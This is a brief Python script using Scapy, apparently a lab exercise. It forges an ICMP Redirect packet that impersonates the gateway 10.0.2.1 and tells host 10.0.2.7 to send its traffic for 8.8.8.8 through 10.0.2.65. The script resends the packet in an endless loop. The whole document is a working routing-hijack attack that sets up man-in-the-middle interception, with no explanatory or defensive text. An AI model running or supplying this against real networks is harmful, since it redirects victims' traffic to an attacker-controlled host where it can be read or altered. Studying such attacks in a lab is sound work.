#!/usr/bin/python3
from scapy.all import *

ip = IP(src="10.0.2.1",dst="10.0.2.7")
icmp = ICMP(type=5,code=1)
icmp.gw = "10.0.2.65"
ip2 = IP(src="10.0.2.7",dst="8.8.8.8")
udp = UDP()
pkt = ip/icmp/ip2/udp
while(1):
        print("=============================")
        pkt.show()
        print("=============================")
        send(pkt)